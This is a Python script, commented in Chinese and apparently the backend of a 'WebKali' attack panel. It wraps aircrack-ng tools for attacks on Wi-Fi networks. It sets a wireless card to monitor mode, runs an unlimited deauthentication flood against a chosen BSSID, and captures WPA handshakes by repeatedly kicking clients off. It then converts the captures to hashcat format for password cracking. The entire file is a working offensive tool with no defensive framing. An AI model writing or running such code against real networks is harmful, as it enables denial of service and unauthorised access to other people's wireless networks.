import argparse
import subprocess
import time
import os
import sys
import shutil
import glob

# ==========================================
# WebKali 攻击执行单元 (完整增强版)
# ==========================================

# 修复环境变量，确保能找到工具
os.environ["PATH"] += os.pathsep + "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"


def run_cmd(cmd):
    """执行命令但不阻塞，返回结果"""
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def log(msg, level="INFO"):
    """格式化输出，方便后端和前端读取"""
    timestamp = time.strftime("%H:%M:%S", time.localtime())
    print(f"[{level}] {msg}")
    sys.stdout.flush()


def setup_monitor(interface, channel):
    log(f"正在配置网卡 {interface} 进入监听模式 (Channel {channel})...", "SYSTEM")

    # 0. 杀掉干扰进程 (非常重要)
    run_cmd("airmon-ng check kill")

    # 1. 尝试使用 airmon-ng (更稳定)
    if shutil.which("airmon-ng"):
        # 停止网卡
        run_cmd(f"ip link set {interface} down")
        # 开启监听
        run_cmd(f"airmon-ng start {interface} {channel}")
        # 重新拉起
        run_cmd(f"ip link set {interface} up")
    else:
        # 2. 强制使用 iw/ip 命令设置 (备用方案)
        run_cmd(f"ip link set {interface} down")
        run_cmd(f"iw dev {interface} set type monitor")
        run_cmd(f"ip link set {interface} up")

    # 3. 强制锁定信道
    run_cmd(f"iw dev {interface} set channel {channel}")
    run_cmd(f"iwconfig {interface} channel {channel}")
    time.sleep(1)
    log(f"网卡 {interface} 已就绪", "SUCCESS")


def attack_deauth(bssid, interface, duration):
    """
    执行 Deauth 洪水攻击
    duration: 0 表示无限攻击，直到被 kill
    """
    log(f"🔥 开始 Deauth 攻击目标: {bssid}")
    log(f"🔥 攻击时长: {'无限' if duration == 0 else str(duration) + '秒'}")

    # -0 0 表示无限次发送 Deauth 包
    # -a 目标BSSID
    # --ignore-negative-one 修复部分网卡报错
    # -D 禁用 AP 探测，提高效率
    cmd = f"aireplay-ng --ignore-negative-one -0 0 -a {bssid} {interface}"

    # 使用 Popen 启动，以便我们可以实时获取输出
    process = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    start_time = time.time()

    try:
        # 实时读取输出并打印，这样前端就能看到了
        while True:
            # 如果设定了时长且超时，则退出 (但在 Evil Twin 模式下通常是无限的)
            if duration > 0 and (time.time() - start_time) > duration:
                log("攻击时间已到，自动停止", "INFO")
                break

            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break

            if line:
                line = line.strip()
                # 过滤一些无用信息，只显示关键攻击日志
                if "Sending 64 directed DeAuth" in line:
                    # 减少刷屏频率，每10次打印一次
                    if int(time.time()) % 2 == 0:
                        print(f"[Attack] ⚡ 正在发送 Deauth 攻击包... (目标已断线)")
                elif "Waiting for beacon frame" in line:
                    print(f"[Search] 正在寻找目标信号... (信道可能不匹配)")
                elif "No such device" in line:
                    print(f"[Error] 网卡丢失或被占用！")
                    break

            sys.stdout.flush()

    except KeyboardInterrupt:
        log("攻击被用户终止", "INFO")
    finally:
        process.terminate()
        run_cmd("killall aireplay-ng")
        log("攻击进程已结束", "SYSTEM")


def capture_handshake(bssid, interface, channel, duration):
    """
    握手包捕获逻辑 (完整实现)
    1. 启动 airodump-ng 抓包
    2. 启动 aireplay-ng 攻击
    3. 实时检查握手包
    """
    duration = int(duration) if int(duration) > 0 else 60
    log(f"开始捕获握手包: {bssid} (限时 {duration}s)", "START")

    # 临时文件前缀
    clean_bssid = bssid.replace(":", "")
    dump_prefix = f"/tmp/handshake_{clean_bssid}"

    # 清理旧文件
    run_cmd(f"rm {dump_prefix}*")

    # 1. 启动抓包 (后台)
    # --output-format pcap,cap
    dump_cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write {dump_prefix} --output-format cap {interface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    start_time = time.time()

    try:
        log("正在监听信道...", "INFO")
        time.sleep(2)  # 等待 airodump 启动

        # 2. 循环检查 + 间歇性攻击
        while (time.time() - start_time) < duration:
            # 每隔 5 秒发送一次 Deauth 攻击 (无需持续攻击，只需踢掉重连)
            log("发送 Deauth 包诱导重连...", "ATTACK")
            run_cmd(f"aireplay-ng -0 5 -a {bssid} {interface} --ignore-negative-one")

            # 3. 检查是否有握手包
            # 使用 aircrack-ng 检查 cap 文件
            cap_files = glob.glob(f"{dump_prefix}*.cap")
            if cap_files:
                latest_cap = max(cap_files, key=os.path.getctime)
                check_cmd = f"aircrack-ng {latest_cap} | grep '1 handshake'"
                result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)

                if "1 handshake" in result.stdout:
                    log("✅ 成功捕获握手包！(WPA Handshake Captured)", "SUCCESS")
                    print("CAPTURED_HS_POTENTIAL")  # 供后端识别的关键词

                    # 尝试转换为 hashcat 格式 (如果有工具)
                    if shutil.which("hcxpcapngtool"):
                        hc_file = f"{dump_prefix}.hc22000"
                        run_cmd(f"hcxpcapngtool -o {hc_file} {latest_cap}")
                        log(f"已转换为 Hashcat 格式: {hc_file}", "INFO")

                    break

            time.sleep(3)

    except Exception as e:
        log(f"捕获出错: {e}", "ERROR")
    finally:
        dump_proc.terminate()
        run_cmd("killall airodump-ng")
        log("捕获任务结束", "SYSTEM")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("mode", help="deauth or handshake")
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--channel", default="1")
    parser.add_argument("--duration", default="0")
    args = parser.parse_args()

    setup_monitor(args.interface, args.channel)

    if args.mode == "deauth":
        attack_deauth(args.bssid, args.interface, int(args.duration))
    elif args.mode == "handshake":
        capture_handshake(args.bssid, args.interface, args.channel, args.duration)
    else:
        log("未知模式", "ERROR")